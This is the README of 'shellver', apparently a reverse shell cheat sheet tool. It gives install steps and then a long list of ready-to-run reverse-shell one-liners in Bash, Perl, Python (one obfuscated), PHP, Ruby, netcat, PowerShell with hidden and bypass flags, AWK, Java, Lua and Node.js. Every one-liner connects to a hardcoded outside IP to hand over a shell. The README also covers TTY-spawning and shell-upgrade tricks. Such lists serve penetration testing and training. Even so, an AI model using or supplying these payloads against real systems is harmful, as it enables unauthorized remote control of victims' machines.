[![GitHub license](https://img.shields.io/github/license/0xR0/shellver.svg)](https://github.com/0xR0/shellver) [![GitHub stars](https://img.shields.io/github/stars/0xR0/shellver.svg)](https://github.com/0xR0/shellver/stargazers) [![GitHub forks](https://img.shields.io/github/forks/0xR0/shellver.svg)](https://github.com/0xR0/shellver/network) [![](https://images.microbadger.com/badges/image/xshuden/shellver.svg)](https://microbadger.com/images/xshuden/shellver "Get your own image badge on microbadger.com") [![](https://images.microbadger.com/badges/version/xshuden/shellver.svg)](https://microbadger.com/images/xshuden/shellver "Get your own version badge on microbadger.com")

                                                        .:: 0xR ::.
                                            .:: Reverse Shell Cheat Sheet Tool ::.
                                                 .:: cyber-warrior.org ::.
 

## Install Note

Clone the repository:

 git clone https://github.com/0xR0/shellver.git
Then go inside:

 cd shellver/
Then install it:

 python setup.py -i
 
For reinstall

 python setup.py -r
 
run shellver -h or "shellver msf {} shell {} spawn".format (or)✔

## Docker Run Command

```
docker run --rm -idt --name shellver xshuden/shellver    # container is deleted when you're done
OR
docker run -idt --name shellver xshuden/shellver
```

#Example

shellver shell

<img src="https://github.com/0xR0/shellver/blob/master/ss/py.png" >


shellver msf

<img src="https://github.com/0xR0/shellver/blob/master/ss/all.png" >

From https://github.com/swisskyrepo
# Reverse Shell Methods

```
╔Bash TCP═══════════════════════════════════════════
║ bash -i >& /dev/tcp/171.25.193.25/1234 0>&1						    
║═══════════════════════════════════════════════════
║ 0<&196;exec 196<>/dev/tcp/171.25.193.25/1234; sh <&196 >&196 2>&196  
╚═══════════════════════════════════════════════════


╔Bash UDP═════════════╦═════════════════════════════
║ Run Target Machine  ║ sh -i >& /dev/udp/171.25.193.25/1234 0>&1   
╚═════════════════════╩═════════════════════════════


╔PERL═══════════════════════════════════════════════
║ perl -e 'use Socket;$i="171.25.193.25";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
╔═══════════════════════════════════════════════════						
║ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"171.25.193.25:1234");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'						
											 
╔══════════════╦════════════════════════════════════
║ Windows only ║ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"171.25.193.25:1234");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'							
  
════════════════════════════════════════════════════						


╔PYTHON═════════════════════════════════════════════ 
║ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("171.25.193.25",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'    

╔═══════════════════════════════════════════════════						
║ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("171.25.193.25",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

╔═══════════════════════════════════════════════════
║ C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('171.25.193.25', 1234)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\windows\system32\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
     
════════════════════════════════════════════════════


╔PHP════════════════════════════════════════════════
║ php -r '$sock=fsockopen("171.25.193.25",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
╚═══════════════════════════════════════════════════


╔RUBY═══════════════════════════════════════════════
║ ruby -rsocket -e'f=TCPSocket.open("171.25.193.25",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
                        
╔═══════════════════════════════════════════════════
║ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("171.25.193.25","1234");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
  
╔══════════════╦════════════════════════════════════
║ Windows only ║ ruby -rsocket -e 'c=TCPSocket.new("171.25.193.25","1234");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
  
════════════════════════════════════════════════════


╔Netcat Traditional═════════════════════════════════
║ nc -e /bin/sh 171.25.193.25 1234
╚═══════════════════════════════════════════════════


╔Netcat OpenBsd═════════════════════════════════════
║ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 171.25.193.25 1234 >/tmp/f	
╚═══════════════════════════════════════════════════


╔NCAT═══════════════════════════════════════════════
║ ncat 171.25.193.25 1234 -e /bin/bash		   
║═══════════════════════════════════════════════════
║ ncat --udp 171.25.193.25 1234 -e /bin/bash  
╚═══════════════════════════════════════════════════


╔POWERSHELL═════════════════════════════════════════ 
║ powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("171.25.193.25",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()  

╔═══════════════════════════════════════════════════						
║ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('171.25.193.25',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

════════════════════════════════════════════════════



╔AWK════════════════════════════════════════════════ 
║ awk 'BEGIN {s = "/inet/tcp/0/171.25.193.25/1234"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

════════════════════════════════════════════════════						


╔JAWA═══════════════════════════════════════════════ 
║ r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/171.25.193.25/1234;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

════════════════════════════════════════════════════						


╔LUA══════════╦═════════════════════════════════════
║ Linux only  ║ lua -e "require('socket');require('os');t=socket.tcp();t:connect('171.25.193.25','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"

════════════════════════════════════════════════════

╔════════════════════╦══════════════════════════════
║ Windows and Linux  ║ lua5.1 -e 'local host, port = "171.25.193.25", 1234 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'

════════════════════════════════════════════════════


╔NODEJS═════════════════════════════════════════════ 
║(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(1234, "171.25.193.25", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();

╔═════╦═════════════════════════════════════════════
║ OR  ║ require('child_process').exec('nc -e /bin/sh 171.25.193.25 1234')
╚═════╩═════════════════════════════════════════════
╔═════╦═════════════════════════════════════════════
║ OR  ║ -var x = global.process.mainModule.require
-x('child_process').exec('nc 171.25.193.25 1234 -e /bin/bash')

════════════════════════════════════════════════════

╔JAWA For GROOVY════════════════════════════════════ 
║ String host="171.25.193.25";
int port=1234;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

════════════════════════════════════════════════════
```
# Spawn TTY

```bash
/bin/sh -i
```

(From an interpreter)

```powershell
python -c 'import pty; pty.spawn("/bin/sh")'
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
```

Access shortcuts, su, nano and autocomplete in a partially tty shell
/!\ OhMyZSH might break this trick, a simple `sh` is recommended

```powershell
# in host
ctrl+z
stty raw -echo
fg

# in reverse shell
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

(From within vi)

```bash
:!bash
:set shell=/bin/bash:shell
```

(From within nmap)

```sh
!sh
```

## Thanks to

* [Reverse Bash Shell One Liner](https://security.stackexchange.com/questions/166643/reverse-bash-shell-one-liner)
* [Pentest Monkey - Cheat Sheet Reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [Spawning a TTY Shell](http://netsec.ws/?p=337)
* [Obtaining a fully interactive shell](https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell)
